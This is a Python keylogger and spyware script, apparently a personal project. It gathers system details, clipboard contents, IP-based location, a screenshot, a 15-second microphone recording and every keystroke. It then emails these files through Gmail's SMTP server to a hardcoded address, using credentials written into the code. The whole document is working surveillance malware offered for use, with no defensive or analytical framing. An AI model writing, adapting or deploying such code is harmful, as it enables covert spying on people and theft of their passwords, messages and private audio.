#liberaries
from email.mime.multipart import MIMEMultipart      #for email
from email.mime.base import MIMEBase                #for email
from email.mime.text import MIMEText                #for email
from email import encoders                          #for email
import smtplib
import pyperclip                                    #clipbd
import geocoder
from pynput.keyboard import Key, Listener

import sounddevice as sd    #for microphone
from scipy.io.wavfile import write #for microphone

from PIL import ImageGrab


#default variables
k_info = "K_log.txt"
k2_info ="K2_log.txt"
email_addrss = "hikeylogger4m3@gmail.com"
password = "keylogger123"
toaddrss = "hikeylogger4m3@gmail.com"

screenshot_information = "ss.png"
audio = "audio.wav"
file_path = "/Users/himanshu/PycharmProjects/KEY_logger"
extend = "/"





#computer information

def sys_info():
    import platform
    a = platform.machine()
    b = platform.version()
    c = platform.system()
    e = platform.uname()
    with open("K_log.txt", 'a') as f:
        f.write("\nmachine info:")
        f.write(a)
    with open("K_log.txt", 'a') as f:
        f.write("\nversion:")
        f.write(b)
    with open("K_log.txt", 'a') as f:
        f.write("\nsystem :")
        f.write(c)
    with open("K_log.txt", 'a') as f:
        f.write(str(e))
sys_info()

#clipboard functionality

def clip_info():
    s = pyperclip.paste()
    pyperclip.copy(s)
    with open("K_log.txt",'a') as f:
        f.write("\nthis is clipboard information:\n")
        f.write(s)
clip_info()

#geolocation functionality

g = geocoder.ip('me')
c = g.latlng
with open("K_log.txt",'a') as f:
    f.write("\nThis is your location:\n")
    f.write(str(c))

#screenshot functionality


def screenshot():
    im = ImageGrab.grab()
    im.save("ss.png")

screenshot()

#microphone functionality
def microphone():
    fs = 44100
    second = 15
    print("recording : ")
    record_voice = sd.rec(int(second*fs), samplerate=fs, channels=2)
    sd.wait()
    write('audio.wav', fs, record_voice)
    print("recording end")
microphone()
# email functionality

def send_email(filename, attachment, toaddrss):
    fromaddr= email_addrss
    msg = MIMEMultipart()
    msg['From']= fromaddr
    msg['To'] = toaddrss
    msg['Subject'] = "log file"
    body= "body_of_mail"
    msg.attach(MIMEText(body,"plain"))

    filename= filename
    attachment=open(attachment,"rb")
    p = MIMEBase('application', 'octect-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('content-Disposition', f"attachment; filename = {filename}")
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddrss,text)
    s.quit()


send_email(audio, file_path + extend + audio, toaddrss)
send_email(screenshot_information, file_path + extend + screenshot_information, toaddrss)

#keys functionality


count = 0
keys =[]

def on_press(key):
    global keys,count
    keys.append(key)
    count +=1
    print(key)



    if count >= 1:
        count = 0
        write_file(str(keys))
        keys = []
with open('K2_log.txt','a') as f:
    f.write("these are pressed keys:\n")

def write_file(key):
    with open("K2_log.txt",'a') as f:
        for key in keys:
            k= str(key).replace("'","")
            if k.find("enter")>0:
                f.write("'enter_key'\n")
            elif k.find("backspace")>0:
                f.write("'backspace_key'\n")
            elif k.find("caps_lock")>0:
                f.write("'caps_lock'\n")
            elif k.find("space") > 0:
                f.write("\t")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()



send_email(k_info, file_path + extend + k_info, toaddrss)
send_email(k2_info, file_path + extend + k2_info, toaddrss)



with open("K_log.txt", 'r+') as f:
    f.truncate(0)
    print(f.read())